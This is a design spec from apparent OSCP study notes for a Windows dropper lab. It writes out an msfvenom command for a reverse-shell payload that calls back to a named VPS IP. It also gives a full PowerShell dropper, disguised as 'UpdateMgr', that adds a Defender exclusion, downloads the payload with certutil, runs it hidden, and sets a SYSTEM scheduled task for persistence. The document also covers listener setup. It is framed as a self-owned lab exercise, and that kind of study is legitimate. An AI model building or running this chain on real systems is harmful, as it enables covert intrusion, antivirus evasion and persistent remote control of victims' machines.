---
title: 2026-08-13-windows-dropper-design
type: note
permalink: oscp/docs/superpowers/specs/2026-08-13-windows-dropper-design
---

# Windows Dropper Lab — Design Spec

**Date:** 2026-08-13
**Status:** Approved by user, awaiting spec review
**Goal:** One double-clickable exe that gets a reverse shell from a Windows VM back to the VPS, plants persistence, and survives Windows Defender — all in a self-owned lab.

## Context and constraints

- **Target:** user's own Windows VM (eval VM, NAT networking, Windows Firewall + Defender on).
- **Attacker:** user's VPS at `2.25.141.57` (reachable via Tailscale as `100.125.52.98`; hostname `hermes-vps`). Has `python3` + `nc`. No msfvenom.
- **Callback:** port `443` (outbound-friendly).
- **Payload transport/storage:** private GitHub repo `git@github.com:JasonSonith/payloads.git` (verified private, VPS authenticates to GitHub as JasonSonith). Cloned at `~/payloads` on the VPS.
- **Build machines:** msfvenom on Kali/WSL; PS2EXE on the Windows machine.
- User runs the dropper interactively in the VM and will click **Yes** at the UAC prompt.
- **Explicitly skipped:** the manual nc + PowerShell one-liner pre-test. If the chain fails, that test becomes the first debug step to split "network problem" from "payload problem."

## Architecture

```
Kali/WSL ──msfvenom──> updater.exe ──┐
                                     ├──git push──> GitHub (private) ──git pull──> VPS ~/payloads
Windows ──PS2EXE────> UpdateMgr.exe ─┘                                     └── python3 -m http.server 80
                                                                                     │
Windows VM: double-click UpdateMgr.exe → UAC → exclusion → certutil download ────────┘
           → run payload → shell as admin user ──> nc -lvnp 443 on VPS
           → scheduled task → shell as SYSTEM after every reboot
```

Two files:

| File | Role | Built with | Where |
|---|---|---|---|
| `updater.exe` | Reverse-shell payload | msfvenom (Kali/WSL) | `~/payloads` on VPS |
| `UpdateMgr.exe` | Dropper (wrapper) | PS2EXE (Windows) | double-clicked in VM |

The dropper must look boring to Defender — it only runs ordinary commands. The spicy payload downloads *after* the exclusion exists.

## Build order

1. **VPS:** clone repo, open firewall, start `http.server` + `nc` (Component 3).
2. **Kali/WSL:** build `updater.exe`, commit + push to the payloads repo.
3. **VPS:** `git pull` — payload is now served at `http://2.25.141.57/updater.exe`.
4. **Windows machine:** write `install.ps1` (keep the source in the payloads repo too, so it's versioned), wrap with PS2EXE → `UpdateMgr.exe`. Copy the exe into the VM (shared folder / clipboard / drag-drop).
5. **Windows VM:** run `UpdateMgr.exe`, follow the test plan.

## Component 1 — `updater.exe` (payload)

Built on Kali/WSL:

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=2.25.141.57 LPORT=443 -f exe -o updater.exe
```

- Stageless (`shell/reverse_tcp`, no underscore) chosen over staged: more reliable over the open internet — no second stage that can fail.
- Plain cmd shell → caught by plain `nc`, no Metasploit handler needed.

## Component 2 — `install.ps1` → `UpdateMgr.exe` (dropper)

Script (draft; implementation may refine):

```powershell
# UpdateMgr dropper - personal lab use only
$ErrorActionPreference = 'Stop'
$dir     = 'C:\ProgramData\Microsoft\UpdateMgr'
$payload = "$dir\updater.exe"
$vps     = '2.25.141.57'

try {
    Write-Host "[1/5] Adding Defender exclusion..."
    Add-MpPreference -ExclusionPath $dir

    Write-Host "[2/5] Creating folder..."
    New-Item -ItemType Directory -Path $dir -Force | Out-Null

    Write-Host "[3/5] Downloading payload..."
    certutil -urlcache -split -f "http://$vps/updater.exe" $payload | Out-Null
    if (-not (Test-Path $payload)) { throw "download failed - is http.server up on the VPS?" }

    Write-Host "[4/5] Running payload..."
    Start-Process $payload -WindowStyle Hidden

    Write-Host "[5/5] Planting persistence..."
    schtasks /create /tn "UpdateMgr" /tr $payload /sc onstart /ru SYSTEM /f | Out-Null

    Write-Host "Done. Shell on ${vps}:443 now, and after every reboot."
} catch {
    Write-Host "FAILED: $_"
    exit 1
}
```

Wrapped on the Windows machine:

```powershell
Install-Module ps2exe -Scope CurrentUser
Invoke-ps2exe -inputFile install.ps1 -outputFile UpdateMgr.exe -requireAdmin
```

- `-requireAdmin` embeds the manifest that makes Windows show the UAC prompt at launch. No self-relaunch logic needed in the script. Clicking **No** means nothing runs — acceptable in lab.
- Console stays visible so each step prints — fail loudly, not silently.

## Component 3 — VPS setup

```bash
git clone git@github.com:JasonSonith/payloads.git ~/payloads
sudo ufw allow 80 && sudo ufw allow 443   # if ufw is active (needs user password)
cd ~/payloads && python3 -m http.server 80   # terminal 1: serves payloads
nc -lvnp 443                                  # terminal 2: catches shells
```

## Persistence

`schtasks /create /tn "UpdateMgr" /tr C:\ProgramData\Microsoft\UpdateMgr\updater.exe /sc onstart /ru SYSTEM /f`

- Runs payload at boot as SYSTEM. Callback only succeeds when the nc listener is up — expected and fine for a lab.

## Error handling

- Per-step console output; script stops at the first failure with the step number visible.
- `Test-Path` guard after download catches the most likely failure (VPS http server not running).
- Known unscriptable failure: Defender flags the *dropper itself* on double-click (before any exclusion exists). Lab fix: temporarily exclude the VM's Downloads folder, verify mechanics, then remove it to study detection.

## Test plan

1. VM browser → `http://2.25.141.57/updater.exe` downloads (proves network path; ignore SmartScreen warning).
2. Double-click `UpdateMgr.exe` → UAC Yes → steps 1-5 print → shell lands on nc as the admin user.
3. Reboot VM → second shell lands; `whoami` → `nt authority\system`.
4. On VM: `Get-MpPreference | Select-Object ExclusionPath` shows our folder; payload file untouched by Defender.
5. If anything fails: run the manual PowerShell one-liner from [[Reverse Shell]] to isolate network vs payload.

## Cleanup (keeps the VM reusable)

```powershell
schtasks /delete /tn "UpdateMgr" /f
Remove-MpPreference -ExclusionPath 'C:\ProgramData\Microsoft\UpdateMgr'
Remove-Item -Recurse -Force 'C:\ProgramData\Microsoft\UpdateMgr'
```

## Security notes

- While `http.server` runs on the public IP, anyone can download those files. Lab is short-lived; stop the server when done.
- Repo must stay **private** (verified: unauthenticated API returns 404). Public hosting of live reverse-shell binaries invites scanner flagging and GitHub ToS problems.
- All targets are user-owned. Nothing here touches a third-party machine.

## Out of scope (YAGNI)

- AV evasion beyond the exclusion trick (obfuscation, AMSI bypass, crypters).
- C2 frameworks, encryption, beaconing/jitter (covered separately in [[Windows Persistence Flow]]).
- Bind shells, Linux targets.